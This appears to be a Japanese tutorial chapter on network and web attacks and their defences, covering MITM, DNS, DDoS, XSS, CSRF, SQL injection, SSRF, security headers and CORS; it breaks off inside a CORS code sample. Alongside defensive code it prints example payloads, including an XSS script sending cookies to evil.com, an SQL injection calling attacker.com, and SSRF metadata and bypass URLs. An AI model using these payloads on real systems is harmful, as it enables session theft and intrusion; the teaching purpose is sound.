# ネットワーク攻撃と対策

> ネットワーク上の主要な攻撃手法と防御策を理解する。MITM、DNS汚染、DDoS、セッションハイジャック、SQLインジェクション等を学び、安全なシステム設計の基盤を固める。

## この章で学ぶこと

- [ ] 主要なネットワーク攻撃の仕組みを理解する
- [ ] 各攻撃に対する防御策を把握する
- [ ] セキュリティ設計の原則を学ぶ
- [ ] セキュリティヘッダーの設定方法を習得する
- [ ] インシデント対応の基本を理解する

---

## 1. 中間者攻撃（MITM）

```
MITM（Man-in-the-Middle）:
  → 通信の間に入り込み、盗聴・改ざんする

  正常:  クライアント ←──────→ サーバー
  MITM:  クライアント ←→ 攻撃者 ←→ サーバー

  攻撃手法:
  ① ARPスプーフィング:
     → LANで偽のARP応答を送り、通信を自分に向ける
     → 同一LAN内の攻撃

     正常: PC → ルーター（MAC: AA:BB:CC:DD:EE:FF）
     攻撃: PC → 攻撃者（MAC: 11:22:33:44:55:66）→ ルーター

     ツール: arpspoof, ettercap, bettercap

  ② Wi-Fiスニッフィング:
     → 暗号化されていないWi-Fiで通信を傍受
     → Evil Twin: 正規のAPと同名の偽APを設置

     正規AP: "Coffee-Shop-WiFi"（暗号化あり）
     偽AP:   "Coffee-Shop-WiFi"（暗号化なし）
     → ユーザーが偽APに接続 → 全通信を傍受

  ③ SSLストリッピング:
     → HTTPS接続をHTTPにダウングレード
     → ユーザーはHTTPで通信していることに気づかない

     ユーザー ──HTTP──→ 攻撃者 ──HTTPS──→ サーバー
     → 攻撃者がHTTPSを終端し、ユーザーにはHTTPで中継

  ④ BGPハイジャック:
     → BGP経路広告を操作してトラフィックを別経路に流す
     → 大規模な通信傍受が可能
     → 実例: 2018年のAmazon Route 53ハイジャック

  防御策:
  ✓ HTTPS（TLS）の必須化
  ✓ HSTS（HTTP Strict Transport Security）
     Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  ✓ 証明書ピンニング（モバイルアプリ）
  ✓ 公共Wi-FiではVPN使用
  ✓ RPKI（Resource Public Key Infrastructure）でBGP保護
```

### 1.1 ARPスプーフィング対策の実装

```bash
# ARPテーブルの確認
$ arp -a

# 静的ARPエントリの設定（重要なゲートウェイ）
$ sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF

# arpwatchで変更を監視（Linux）
$ sudo apt install arpwatch
$ sudo arpwatch -i eth0

# DAI（Dynamic ARP Inspection）— Ciscoスイッチ
# DHCPスヌーピングと連携してARP応答を検証
interface GigabitEthernet0/1
  ip arp inspection trust  # アップリンクポートは信頼

# 802.1X認証（ネットワークアクセス制御）
# → 未認証デバイスをネットワークから排除
```

```python
# ARP監視スクリプト（Python / Scapy）
from scapy.all import ARP, sniff
from collections import defaultdict
import logging

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger("arp_monitor")

# IPアドレスとMACアドレスのマッピング
arp_table = defaultdict(set)

def detect_arp_spoof(packet):
    """ARPスプーフィングを検知する"""
    if packet.haslayer(ARP) and packet[ARP].op == 2:  # ARP応答
        src_ip = packet[ARP].psrc
        src_mac = packet[ARP].hwsrc

        if src_ip in arp_table:
            if src_mac not in arp_table[src_ip]:
                logger.warning(
                    f"ARP Spoofing detected! "
                    f"IP {src_ip} was {arp_table[src_ip]}, "
                    f"now claims to be {src_mac}"
                )
                # アラート送信、ネットワーク管理者に通知
                send_alert(src_ip, arp_table[src_ip], src_mac)

        arp_table[src_ip].add(src_mac)

def send_alert(ip, old_macs, new_mac):
    """セキュリティアラートを送信"""
    # Slack, PagerDuty等に通知
    pass

# 監視開始
sniff(filter="arp", prn=detect_arp_spoof, store=0)
```

---

## 2. DNS攻撃

```
① DNSキャッシュポイズニング:
  → リゾルバのキャッシュに偽のレコードを注入
  → ユーザーを偽サイトに誘導

  正常: example.com → 93.184.216.34（正しいIP）
  攻撃: example.com → 192.0.2.100（攻撃者のIP）

  攻撃手法（Kaminsky Attack）:
  1. 攻撃者がリゾルバにランダムなサブドメインを問い合わせ
     → random12345.example.com
  2. リゾルバが権威DNSに問い合わせ中に大量の偽レスポンスを送信
  3. トランザクションIDが一致すれば偽レスポンスが受理
  4. キャッシュに偽のNSレコードが注入 → example.com全体を乗っ取り

  防御: DNSSEC（DNS Security Extensions）
  → DNSレコードに電子署名を付与
  → 改ざんを検知可能

  DNSSEC検証チェーン:
  ルートゾーン（.）→ TLD（.com）→ ドメイン（example.com）
  各レベルでRRSIG（署名）+ DNSKEY（公開鍵）+ DS（委任署名者）

② DNSハイジャック:
  → ドメインの権威DNSサーバーの設定を変更
  → レジストラのアカウント侵害等

  実例:
  → 2018年: Sea Turtle攻撃（国家レベルのDNSハイジャック）
  → 2019年: GoDaddy従業員によるソーシャルエンジニアリング

  防御:
  ✓ レジストラの2FA有効化
  ✓ ドメインロック（clientTransferProhibited）
  ✓ レジストリロック（高価値ドメイン、月額$50-300）
  ✓ DNS変更の監視（CAA, Certificate Transparency）

③ DNS増幅攻撃（DDoSの一種）:
  → 送信元IPを偽装してDNSに問い合わせ
  → 小さなリクエストで大きなレスポンスを被害者に集中

  リクエスト: 64バイト → レスポンス: 3,000バイト
  → 約50倍の増幅

  増幅に使われるプロトコル:
  DNS:     50倍
  NTP:     550倍
  memcached: 50,000倍
  SSDP:    30倍

④ DNSトンネリング:
  → DNS問い合わせにデータを埋め込んで通信
  → ファイアウォールを迂回

  data.encoded-payload.evil.com → TXTレコードで応答データ返却
  → C2（Command & Control）通信に悪用

  検知:
  → 異常に長いDNSクエリ
  → TXTレコードの高頻度問い合わせ
  → 未知ドメインへの大量DNS問い合わせ
```

### 2.1 DNSSEC設定と検証

```bash
# DNSSEC の検証確認
$ dig example.com +dnssec +short
93.184.216.34
A 13 2 86400 20240401120000 20240301120000 12345 example.com. <署名値>

# DNSSEC チェーンの確認
$ dig example.com +sigchase +trusted-key=./root.keys

# DNSSECが有効か確認
$ dig example.com +short +cd  # CD=Checking Disabled
$ dig example.com +short       # DNSSEC検証あり
# 両方同じ結果 → 正常
# CD付きのみ結果あり → DNSSEC検証失敗

# drill コマンドでDNSSEC検証（ldns-utils）
$ drill -S example.com

# DNSViz（オンライン検証）
# https://dnsviz.net/d/example.com/dnssec/

# unbound でDNSSEC検証（ローカルリゾルバ）
# /etc/unbound/unbound.conf
server:
    auto-trust-anchor-file: "/var/lib/unbound/root.key"
    val-clean-additional: yes
    val-permissive-mode: no  # 検証失敗時にSERVFAIL返却
```

---

## 3. DDoS攻撃

```
DDoS（Distributed Denial of Service）:
  → 大量のトラフィックでサービスを停止させる

  攻撃規模の進化:
  2010年代: 数十 Gbps
  2020年代: 数 Tbps（テラビット級）
  2023年: Cloudflareが201百万RPSのHTTP DDoSを記録

  攻撃の分類:
  ┌──────────┬──────────────────────────────────┐
  │ 層       │ 攻撃手法                          │
  ├──────────┼──────────────────────────────────┤
  │ L3/L4    │ SYNフラッド: 大量のSYNパケット    │
  │（ネット）│ UDPフラッド: 大量のUDPパケット    │
  │          │ 増幅攻撃: DNS/NTP/memcached       │
  │          │ ICMP フラッド: ping of death       │
  │          │ フラグメント攻撃: 断片パケット集中│
  ├──────────┼──────────────────────────────────┤
  │ L7       │ HTTPフラッド: 大量のHTTPリクエスト│
  │（アプリ）│ Slowloris: 接続を長時間占有      │
  │          │ RUDY: POSTボディを低速送信        │
  │          │ API乱用: 高コストなAPI呼び出し    │
  │          │ ReDoS: 正規表現の計算爆発          │
  └──────────┴──────────────────────────────────┘
```

### 3.1 各攻撃の詳細と防御

```
SYNフラッド:
  → TCPの3-wayハンドシェイクを悪用
  → 大量のSYNパケットを送信、ACKを返さない
  → サーバーのSYNキューが枯渇

  攻撃者 ── SYN ──→ サーバー（SYN_RECEIVED状態で待機）
  攻撃者 ── SYN ──→ サーバー（SYN_RECEIVED状態で待機）
  ... 数千〜数百万のSYN

  防御:
  ① SYN Cookie:
     → サーバーがSYN_RECEIVEDの状態を保持しない
     → SYNのACKにシーケンス番号として暗号化情報を含める
     → クライアントのACKからセッション情報を復元

  ② SYNプロキシ:
     → ロードバランサーやファイアウォールが3-wayハンドシェイクを代行
     → 正常なハンドシェイク完了後にバックエンドに転送

  ③ カーネルパラメータ調整（Linux）:
     net.ipv4.tcp_syncookies = 1
     net.ipv4.tcp_max_syn_backlog = 65535
     net.ipv4.tcp_synack_retries = 2
     net.core.somaxconn = 65535

Slowloris:
  → HTTPリクエストヘッダーを極めて低速に送信
  → サーバーのコネクション数を枯渇させる
  → 少ないリソースで効果的

  攻撃:
  GET / HTTP/1.1\r\n
  Host: target.com\r\n
  X-a: 1\r\n          ← 数秒間隔でヘッダーを追加し続ける
  X-b: 2\r\n          ← リクエストが完了しない
  ...                  ← タイムアウトまでコネクション占有

  防御:
  ✓ リクエストヘッダーのタイムアウト設定
    Nginx: client_header_timeout 10s;
    Apache: RequestReadTimeout header=10-20,MinRate=500
  ✓ 同一IPからのコネクション数制限
  ✓ リバースプロキシの導入（Nginx は Slowloris に強い）

HTTP フラッド（L7 DDoS）:
  → 正常なHTTPリクエストを大量送信
  → ボットネットから分散して送信
  → 正規トラフィックとの区別が困難

  防御:
  ✓ WAF（Web Application Firewall）
  ✓ レート制限（IP/ユーザーベース）
  ✓ CAPTCHAチャレンジ
  ✓ JavaScriptチャレンジ（Bot検知）
  ✓ 行動分析（異常検知）
```

### 3.2 DDoS防御の多層アプローチ

```
DDoS防御の全体像:

  ┌─────────────────────────────────────────┐
  │ CDN / DDoS Protection（Cloudflare等）    │ ← L3/L4/L7
  │   → Anycast で分散受信                   │
  │   → 不正トラフィックを吸収               │
  ├─────────────────────────────────────────┤
  │ WAF（Web Application Firewall）          │ ← L7
  │   → SQLi, XSS, Bot等のフィルタリング     │
  │   → IPレピュテーション                   │
  ├─────────────────────────────────────────┤
  │ ロードバランサー                         │ ← L4/L7
  │   → ヘルスチェック、オートスケール連携    │
  ├─────────────────────────────────────────┤
  │ レート制限                               │ ← L7
  │   → Nginx / API Gateway                  │
  │   → IP, ユーザー, APIキー単位             │
  ├─────────────────────────────────────────┤
  │ アプリケーション                         │
  │   → 入力検証、キャッシュ                  │
  │   → サーキットブレーカー                  │
  └─────────────────────────────────────────┘
```

```nginx
# Nginx レート制限設定
http {
    # レート制限ゾーンの定義
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;

    # コネクション数制限
    limit_conn_zone $binary_remote_addr zone=addr:10m;

    server {
        # API エンドポイント: 10リクエスト/秒、バースト20
        location /api/ {
            limit_req zone=api burst=20 nodelay;
            limit_req_status 429;

            # コネクション数制限
            limit_conn addr 100;

            proxy_pass http://backend;
        }

        # ログインエンドポイント: 1リクエスト/秒、バースト5
        location /api/auth/login {
            limit_req zone=login burst=5 nodelay;
            limit_req_status 429;
            proxy_pass http://backend;
        }

        # 429レスポンスのカスタマイズ
        error_page 429 = @rate_limited;
        location @rate_limited {
            default_type application/json;
            return 429 '{"error":"Too Many Requests","retry_after":60}';
        }
    }
}
```

```python
# Python / FastAPIでのレート制限実装
from fastapi import FastAPI, Request, HTTPException
from datetime import datetime, timedelta
import asyncio

app = FastAPI()

# スライディングウィンドウカウンター（Redis推奨）
class RateLimiter:
    def __init__(self, max_requests: int, window_seconds: int):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.requests: dict[str, list[float]] = {}
        self._lock = asyncio.Lock()

    async def is_allowed(self, key: str) -> tuple[bool, dict]:
        async with self._lock:
            now = datetime.now().timestamp()
            window_start = now - self.window_seconds

            # ウィンドウ外のリクエストを削除
            if key in self.requests:
                self.requests[key] = [
                    t for t in self.requests[key] if t > window_start
                ]
            else:
                self.requests[key] = []

            current_count = len(self.requests[key])
            remaining = self.max_requests - current_count

            headers = {
                "X-RateLimit-Limit": str(self.max_requests),
                "X-RateLimit-Remaining": str(max(0, remaining - 1)),
                "X-RateLimit-Reset": str(int(window_start + self.window_seconds)),
            }

            if current_count >= self.max_requests:
                headers["Retry-After"] = str(self.window_seconds)
                return False, headers

            self.requests[key].append(now)
            return True, headers

# API: 100リクエスト/分
api_limiter = RateLimiter(max_requests=100, window_seconds=60)

# ログイン: 5リクエスト/分
login_limiter = RateLimiter(max_requests=5, window_seconds=60)

@app.middleware("http")
async def rate_limit_middleware(request: Request, call_next):
    client_ip = request.client.host
    path = request.url.path

    if path.startswith("/api/auth/login"):
        limiter = login_limiter
    elif path.startswith("/api/"):
        limiter = api_limiter
    else:
        return await call_next(request)

    allowed, headers = await limiter.is_allowed(client_ip)

    if not allowed:
        raise HTTPException(
            status_code=429,
            detail="Too Many Requests",
            headers=headers,
        )

    response = await call_next(request)
    for key, value in headers.items():
        response.headers[key] = value
    return response
```

---

## 4. Webアプリケーション攻撃

### 4.1 XSS（Cross-Site Scripting）

```
XSS（Cross-Site Scripting）:
  → 悪意のあるスクリプトをWebページに注入

  タイプ:
  ① Stored XSS（格納型）:
     → DBに保存される（コメント欄等）
     → 全ユーザーに影響
     → 最も危険

     攻撃: コメント欄に投稿:
     <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

     → 他のユーザーがページを閲覧 → Cookie窃取

  ② Reflected XSS（反射型）:
     → URLパラメータ経由
     → フィッシングメールのリンクで誘導

     攻撃URL:
     https://example.com/search?q=<script>alert(document.cookie)</script>

  ③ DOM-based XSS:
     → クライアント側のJS処理で発生
     → サーバーを経由しない

     脆弱なコード:
     document.getElementById('output').innerHTML = location.hash.substring(1);

     攻撃: https://example.com/#<img src=x onerror=alert(1)>

  防御策の詳細:

  ① 出力エスケープ:
     HTML: < → &lt;  > → &gt;  & → &amp;  " → &quot;
     JavaScript: Unicode エスケープ
     URL: パーセントエンコーディング
     CSS: バックスラッシュエスケープ

  ② Content-Security-Policy:
     Content-Security-Policy:
       default-src 'self';
       script-src 'self' 'nonce-abc123';
       style-src 'self' 'unsafe-inline';
       img-src 'self' data: https:;
       font-src 'self' https://fonts.gstatic.com;
       connect-src 'self' https://api.example.com;
       frame-ancestors 'none';
       base-uri 'self';
       form-action 'self';

     nonce ベース:
     <script nonce="abc123">/* 許可されたスクリプト */</script>

  ③ HttpOnly Cookie:
     Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
     → JavaScriptからdocument.cookieでアクセス不可

  ④ Trusted Types（Chrome実装）:
     Content-Security-Policy: require-trusted-types-for 'script'
     → innerHTML等の危険なAPIの直接使用を禁止
```

```typescript
// XSS対策の実装例（TypeScript）

// HTMLエスケープ
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// DOMPurify によるサニタイズ（ライブラリ使用推奨）
import DOMPurify from 'dompurify';

// リッチテキストの安全な挿入
function safeInsertHtml(element: HTMLElement, html: string): void {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false,
  });
  element.innerHTML = clean;
}

// CSP nonce生成（サーバーサイド）
import crypto from 'crypto';

function generateCspNonce(): string {
  return crypto.randomBytes(16).toString('base64');
}

// Express ミドルウェアでCSP設定
function cspMiddleware(req: any, res: any, next: any) {
  const nonce = generateCspNonce();
  res.locals.cspNonce = nonce;

  res.setHeader('Content-Security-Policy', [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' data: https:`,
    `connect-src 'self' https://api.example.com`,
    `frame-ancestors 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
  ].join('; '));

  next();
}
```

### 4.2 CSRF（Cross-Site Request Forgery）

```
CSRF（Cross-Site Request Forgery）:
  → ユーザーの認証状態を悪用して意図しない操作を実行

  攻撃シナリオ:
  1. ユーザーが銀行サイトにログイン中
  2. 攻撃者の罠サイトにアクセス
  3. 罠サイトが自動的に銀行APIにリクエストを送信
  4. ユーザーのCookieが自動送信 → 送金が実行される

  攻撃コード（罠サイト）:
  <form action="https://bank.example.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker" />
    <input type="hidden" name="amount" value="1000000" />
  </form>
  <script>document.forms[0].submit();</script>

  防御策:

  ① CSRFトークン（Synchronizer Token Pattern）:
     → フォームに一意のトークンを埋め込み
     → サーバーでリクエスト時に検証

     <form action="/transfer" method="POST">
       <input type="hidden" name="_csrf" value="random-token-abc" />
       ...
     </form>

  ② Double Submit Cookie:
     → CSRFトークンをCookieとリクエストボディの両方に含める
     → サーバーで両者の一致を確認
     → ステートレスで実装可能

  ③ SameSite Cookie:
     Set-Cookie: session=abc; SameSite=Lax

     SameSite=Strict: クロスサイトリクエストでCookieを送信しない
     SameSite=Lax:    トップレベルナビゲーション（GETリンク）のみ送信
     SameSite=None:   送信する（Secure属性必須）

  ④ Origin / Referer ヘッダーの検証:
     → リクエスト元のドメインを確認
     → 自ドメイン以外からのリクエストを拒否

  ⑤ カスタムヘッダーの要求:
     → X-Requested-With: XMLHttpRequest
     → CORSプリフライトが必要になり、クロスサイトから送信不可
```

```python
# CSRF対策実装（Python / FastAPI）
from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse
import secrets
import hmac

app = FastAPI()

# CSRFトークン生成・検証
class CSRFProtection:
    def __init__(self, secret_key: str):
        self.secret_key = secret_key

    def generate_token(self, session_id: str) -> str:
        """セッションに紐づいたCSRFトークンを生成"""
        random_part = secrets.token_hex(16)
        signature = hmac.new(
            self.secret_key.encode(),
            f"{session_id}:{random_part}".encode(),
            "sha256"
        ).hexdigest()
        return f"{random_part}:{signature}"

    def verify_token(self, session_id: str, token: str) -> bool:
        """CSRFトークンを検証"""
        try:
            random_part, signature = token.split(":")
            expected = hmac.new(
                self.secret_key.encode(),
                f"{session_id}:{random_part}".encode(),
                "sha256"
            ).hexdigest()
            return hmac.compare_digest(signature, expected)
        except (ValueError, AttributeError):
            return False

csrf = CSRFProtection(secret_key="your-secret-key")

@app.get("/form", response_class=HTMLResponse)
async def get_form(request: Request):
    session_id = request.cookies.get("session_id", "")
    token = csrf.generate_token(session_id)
    return f"""
    <form method="POST" action="/submit">
        <input type="hidden" name="_csrf" value="{token}" />
        <input type="text" name="data" />
        <button type="submit">送信</button>
    </form>
    """

@app.post("/submit")
async def submit_form(
    request: Request,
    _csrf: str = Form(...),
    data: str = Form(...)
):
    session_id = request.cookies.get("session_id", "")
    if not csrf.verify_token(session_id, _csrf):
        raise HTTPException(status_code=403, detail="CSRF token invalid")
    return {"message": "Success", "data": data}
```

### 4.3 SQLインジェクション

```
SQLインジェクション:
  → SQL文に悪意のある入力を注入

  攻撃例:
  入力: ' OR 1=1 --
  SQL: SELECT * FROM users WHERE name = '' OR 1=1 --'
  → 全ユーザーのデータが返される

  高度な攻撃:
  ① UNION ベース:
     入力: ' UNION SELECT username, password FROM users --
     → 別テーブルのデータを取得

  ② Blind SQLi（ブールベース）:
     入力: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' --
     → 1文字ずつパスワードを特定

  ③ Time-based Blind:
     入力: ' AND IF(1=1, SLEEP(5), 0) --
     → レスポンス時間の差で情報を推測

  ④ Out-of-band:
     入力: '; EXEC xp_dirtree '//attacker.com/share' --
     → サーバーから攻撃者への通信を発生させてデータ送出

  防御:
  ✓ パラメータ化クエリ（Prepared Statement）
  ✓ ORM の使用
  ✓ 入力のバリデーション（ホワイトリスト）
  ✗ 文字列連結でSQLを構築しない
  ✗ ブラックリスト方式のフィルタリングは不十分
```

```python
# SQLインジェクション対策（Python）

# 脆弱なコード（絶対にNG）
def get_user_vulnerable(username: str):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)  # SQLインジェクション可能！

# 安全なコード（Prepared Statement）
def get_user_safe(username: str):
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))  # パラメータ化

# SQLAlchemy ORM（推奨）
from sqlalchemy import select
from sqlalchemy.orm import Session

def get_user_orm(session: Session, username: str):
    stmt = select(User).where(User.username == username)
    return session.execute(stmt).scalar_one_or_none()

# 動的クエリが必要な場合（ソート等）
ALLOWED_SORT_COLUMNS = {"name", "created_at", "email"}
ALLOWED_SORT_ORDERS = {"asc", "desc"}

def get_users_sorted(sort_by: str, order: str):
    # ホワイトリスト検証
    if sort_by not in ALLOWED_SORT_COLUMNS:
        raise ValueError(f"Invalid sort column: {sort_by}")
    if order not in ALLOWED_SORT_ORDERS:
        raise ValueError(f"Invalid sort order: {order}")

    # 検証済みの値のみ使用
    query = f"SELECT * FROM users ORDER BY {sort_by} {order}"
    cursor.execute(query)
```

### 4.4 SSRF（Server-Side Request Forgery）

```
SSRF（Server-Side Request Forgery）:
  → サーバーに内部リソースへのリクエストを実行させる

  攻撃例:
  GET /api/fetch?url=http://169.254.169.254/latest/meta-data/
  → AWSメタデータからIAMクレデンシャルを窃取

  GET /api/fetch?url=http://localhost:6379/
  → 内部のRedisに直接アクセス

  GET /api/fetch?url=http://10.0.0.1/admin/
  → 内部ネットワークの管理画面にアクセス

  バイパステクニック:
  → 127.0.0.1 の代替: 0x7f000001, 2130706433, 0177.0.0.1
  → localhost の代替: 127.0.0.1, [::1], 0.0.0.0
  → DNS rebinding: 最初はパブリックIP、後で内部IPに変更
  → URL パース差異: http://evil.com\@internal/

  防御:
  ✓ URLのホワイトリスト検証
  ✓ 内部IPアドレスへのリクエストをブロック
  ✓ IMDSv2 の使用（AWS）— トークンベースのメタデータアクセス
  ✓ DNS解決後のIPアドレス検証
  ✓ ネットワークレベルの制限（ファイアウォール）
  ✓ ssrf-filter等のライブラリ使用
```

```python
# SSRF対策実装（Python）
import ipaddress
import socket
from urllib.parse import urlparse

BLOCKED_IP_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),       # プライベート
    ipaddress.ip_network('172.16.0.0/12'),     # プライベート
    ipaddress.ip_network('192.168.0.0/16'),    # プライベート
    ipaddress.ip_network('127.0.0.0/8'),       # ループバック
    ipaddress.ip_network('169.254.0.0/16'),    # リンクローカル（メタデータ）
    ipaddress.ip_network('0.0.0.0/8'),         # 自ネットワーク
    ipaddress.ip_network('::1/128'),           # IPv6ループバック
    ipaddress.ip_network('fc00::/7'),          # IPv6プライベート
    ipaddress.ip_network('fe80::/10'),         # IPv6リンクローカル
]

ALLOWED_SCHEMES = {'http', 'https'}
ALLOWED_PORTS = {80, 443, 8080, 8443}

def validate_url(url: str) -> bool:
    """SSRFを防ぐURLバリデーション"""
    try:
        parsed = urlparse(url)

        # スキーム検証
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False

        # ポート検証
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        if port not in ALLOWED_PORTS:
            return False

        # ホスト名解決
        hostname = parsed.hostname
        if not hostname:
            return False

        # DNS解決してIPアドレスを取得
        resolved_ips = socket.getaddrinfo(hostname, port)
        for family, socktype, proto, canonname, sockaddr in resolved_ips:
            ip = ipaddress.ip_address(sockaddr[0])

            # プライベートIP範囲チェック
            for blocked_range in BLOCKED_IP_RANGES:
                if ip in blocked_range:
                    return False

        return True

    except (ValueError, socket.gaierror):
        return False

# 使用例
@app.get("/api/fetch")
async def fetch_url(url: str):
    if not validate_url(url):
        raise HTTPException(
            status_code=400,
            detail="URL not allowed"
        )
    # 安全なURLのみフェッチ
    async with httpx.AsyncClient() as client:
        response = await client.get(url, follow_redirects=False)
    return response.json()
```

---

## 5. セキュリティヘッダー

```
推奨するHTTPセキュリティヘッダー:

① Content-Security-Policy（CSP）:
  → XSS対策の最重要ヘッダー
  Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-abc123';
    style-src 'self' https://fonts.googleapis.com;
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;
    media-src 'none';
    object-src 'none';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;

  CSP報告:
  Content-Security-Policy-Report-Only: ...
  report-uri /api/csp-report;
  → 違反時にレポートを送信（ブロックはしない）
  → 段階的導入に有効

② X-Frame-Options:
  → クリックジャッキング対策
  X-Frame-Options: DENY
  → frame-ancestors 'none' (CSP) と併用推奨

③ X-Content-Type-Options:
  → MIMEタイプスニッフィング対策
  X-Content-Type-Options: nosniff
  → ブラウザがContent-Typeを推測しない

④ Strict-Transport-Security:
  → HTTPS強制
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

⑤ Referrer-Policy:
  → Referrer情報の制限
  Referrer-Policy: strict-origin-when-cross-origin
  → 同一オリジン: 完全URL、クロスオリジン: オリジンのみ

⑥ Permissions-Policy（旧Feature-Policy）:
  → ブラウザ機能の制限
  Permissions-Policy:
    camera=(),
    microphone=(),
    geolocation=(),
    payment=(),
    usb=(),
    magnetometer=(),
    gyroscope=(),
    accelerometer=()

⑦ Cross-Origin-Opener-Policy（COOP）:
  Cross-Origin-Opener-Policy: same-origin
  → Spectre攻撃対策

⑧ Cross-Origin-Embedder-Policy（COEP）:
  Cross-Origin-Embedder-Policy: require-corp
  → SharedArrayBuffer等の使用に必要

⑨ Cross-Origin-Resource-Policy（CORP）:
  Cross-Origin-Resource-Policy: same-site
  → クロスオリジンでのリソース埋め込みを制限
```

```nginx
# Nginx セキュリティヘッダー設定
server {
    # CSP
    add_header Content-Security-Policy
      "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" always;

    # クリックジャッキング
    add_header X-Frame-Options "DENY" always;

    # MIMEスニッフィング
    add_header X-Content-Type-Options "nosniff" always;

    # HSTS
    add_header Strict-Transport-Security
      "max-age=63072000; includeSubDomains; preload" always;

    # Referrer
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # 機能制限
    add_header Permissions-Policy
      "camera=(), microphone=(), geolocation=(), payment=()" always;

    # COOP / COEP
    add_header Cross-Origin-Opener-Policy "same-origin" always;
    add_header Cross-Origin-Resource-Policy "same-site" always;

    # X-Powered-By等の不要ヘッダー削除
    proxy_hide_header X-Powered-By;
    server_tokens off;
}
```

```
確認ツール:
  → https://securityheaders.com/
  → https://observatory.mozilla.org/
  → Chrome DevTools → Network → Response Headers
  → curl -I https://example.com
```

---

## 6. セキュリティ設計の原則

```
① 多層防御（Defense in Depth）:
  → 1つの防御が破られても次の層で防ぐ
  → WAF → ファイアウォール → アプリ → DB

  例（SQLインジェクション対策）:
  Layer 1: WAFでSQLインジェクションパターンをフィルタ
  Layer 2: アプリで入力バリデーション
  Layer 3: Prepared Statementでパラメータ化
  Layer 4: DBユーザーの権限を最小限に（SELECT ONLYなど）
  → 1つの層が突破されても次の層で防御

② 最小権限の原則（Least Privilege）:
  → 必要最小限の権限のみ付与
  → IAMポリシー、DBユーザー権限

  例:
  → APIサーバーのDBユーザー: SELECT, INSERT, UPDATE のみ（DELETE不可）
  → Lambda関数: 必要なS3バケットのみアクセス可能
  → Kubernetes Pod: 必要なSecretのみマウント

③ ゼロトラスト（Zero Trust）:
  → 「内部ネットワークだから安全」を前提としない
  → 常に認証・認可を要求
  → "Never trust, always verify"

  従来:  社内ネットワーク = 信頼 → VPNで社内に入れば何でもアクセス
  ゼロトラスト: 全リクエストを検証 → mTLS + JWT + ポリシーエンジン

  実装要素:
  → アイデンティティ基盤（IdP）
  → デバイス認証・評価
  → マイクロセグメンテーション
  → 継続的な検証（セッション中も）

④ フェイルセキュア:
  → エラー時は安全な状態にフォールバック
  → 認証エラー → アクセス拒否（許可ではない）
  → 設定エラー → デフォルト拒否

⑤ 入力の検証:
  → 全ての外部入力を信頼しない
  → バリデーション: 形式・範囲のチェック
  → サニタイズ: 危険な文字の除去/エスケープ
  → 正規化: Unicode正規化、パストラバーサル対策

⑥ セキュリティの可視化:
  → 全てのアクセスをログに記録
  → 異常検知（SIEM）
  → アラート通知
  → 定期的な監査
```

---

## 7. CORS（Cross-Origin Resource Sharing）

```
CORS:
  → 異なるオリジン間でのリソース共有を制御
  → ブラウザのセキュリティ機能（Same-Origin Policy）を緩和

Same-Origin Policy:
  → 同じオリジン（スキーム + ホスト + ポート）のみリクエスト許可
  → https://app.example.com → https://api.example.com は異なるオリジン

CORSのフロー:

① Simple Request（プリフライトなし）:
  → GET, HEAD, POST（一部Content-Type）
  → カスタムヘッダーなし

  ブラウザ → APIサーバー:
    GET /api/data
    Origin: https://app.example.com

  APIサーバー → ブラウザ:
    Access-Control-Allow-Origin: https://app.example.com
    → ブラウザがOriginとAllow-Originを照合

② Preflight Request（プリフライトあり）:
  → PUT, DELETE, カスタムヘッダー等
  → OPTIONSリクエストで事前確認

  ブラウザ → APIサーバー:
    OPTIONS /api/data
    Origin: https://app.example.com
    Access-Control-Request-Method: PUT
    Access-Control-Request-Headers: Authorization, Content-Type

  APIサーバー → ブラウザ:
    Access-Control-Allow-Origin: https://app.example.com
    Access-Control-Allow-Methods: GET, POST, PUT, DELETE
    Access-Control-Allow-Headers: Authorization, Content-Type
    Access-Control-Max-Age: 86400  ← プリフライトキャッシュ

CORSのセキュリティ注意:
  ✗ Access-Control-Allow-Origin: * + credentials
     → Cookie/認証ヘッダーの送信不可
  ✓ 許可するオリジンを明示的に指定
  ✗ リクエストのOriginヘッダーをそのまま反射しない
     → 任意のオリジンが許可されてしまう
```

```python
# CORS設定（Python / FastAPI）
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# 許可するオリジンのリスト
ALLOWED_ORIGINS = [
    "https://app.example.com",
    "https://admin.example.com",
]

# 開発環境のみ追加
import os
if os.getenv("ENV") == "development":
